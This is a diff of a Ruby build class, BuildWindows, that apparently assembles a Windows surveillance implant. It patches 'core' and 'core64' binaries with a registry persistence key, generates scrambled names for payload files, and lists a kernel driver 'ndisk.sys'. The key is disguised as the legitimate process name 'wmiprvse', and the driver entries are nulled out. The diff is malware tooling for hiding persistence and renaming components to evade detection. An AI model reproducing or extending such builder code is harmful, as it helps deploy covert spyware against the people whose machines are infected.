@@ -62,7 +62,7 @@ class BuildWindows < Build
     patch_file(:file => 'core') do |content|
       begin
         # the new registry key
-        content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key.ljust(38, "\x00")
+        content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key(@factory.confkey).ljust(38, "\x00")
         # and the old one (previous method)
         core = scramble_name(@factory.seed, 3)
         dir = scramble_name(core[0..7], 7)
@@ -103,7 +103,7 @@ class BuildWindows < Build
     patch_file(:file => 'core64') do |content|
       begin
         # the new registry key
-        content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key.ljust(38, "\x00")
+        content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key(@factory.confkey).ljust(38, "\x00")
       rescue
         raise "Registry key marker not found"
       end
@@ -125,16 +125,18 @@ class BuildWindows < Build
 
     core = scramble_name(@factory.seed, 3)
     core_backup = scramble_name(core, 32)
-    dir = scramble_name(core[0..7], 7)
+    olddir = scramble_name(core[0..7], 7)
+    dir = reg_start_key(@factory.confkey)
     config = scramble_name(core[0] < core_backup[0] ? core : core_backup, 1)
     codec = scramble_name(config, 2)
     driver = scramble_name(config, 4)
     driver64 = scramble_name(config, 16)
     core64 = scramble_name(config, 15)
-    reg = '*' + scramble_name(dir, 1)[1..-1]
+    oldreg = '*' + scramble_name(olddir, 1)[1..-1]
+    reg = reg_start_key(@factory.confkey)
 
     @scrambled = {core: core, core64: core64, driver: driver, driver64: driver64,
-                  dir: dir, reg: reg, config: config, codec: codec }
+                  dir: dir, reg: reg, olddir: olddir, oldreg: oldreg, config: config, codec: codec }
 
     # call the super which will actually do the renaming
     # starting from @outputs and @scrambled
@@ -173,11 +175,19 @@ class BuildWindows < Build
         f.puts "HCORE=#{@scrambled[:core]}"
         f.puts "HCONF=#{@scrambled[:config]}"
         f.puts "CODEC=#{@scrambled[:codec]}"
-        f.puts "HDRV=#{@scrambled[:driver]}"
         f.puts "DLL64=#{@scrambled[:core64]}"
-        f.puts "DRIVER64=#{@scrambled[:driver64]}"
+
+        # TODO: driver removal
+        f.puts "HDRV=null"
+        f.puts "DRIVER64=null"
+
+        #f.puts "HDRV=#{@scrambled[:driver]}"
+        #f.puts "DRIVER64=#{@scrambled[:driver64]}"
+
         f.puts "HDIR=#{@scrambled[:dir]}"
         f.puts "HREG=#{@scrambled[:reg]}"
+        f.puts "HOLDDIR=#{@scrambled[:olddir]}"
+        f.puts "HOLDREG=#{@scrambled[:oldreg]}"
         f.puts "HSYS=ndisk.sys"
         f.puts "HKEY=#{key}"
         f.puts "MANIFEST=" + ((params['admin'] == true) ? 'yes' : 'no')
@@ -302,7 +312,7 @@ class BuildWindows < Build
     do_signature
   end
 
-  def reg_start_key
+  def reg_start_key(seed)
     return 'wmiprvse'
   end
 
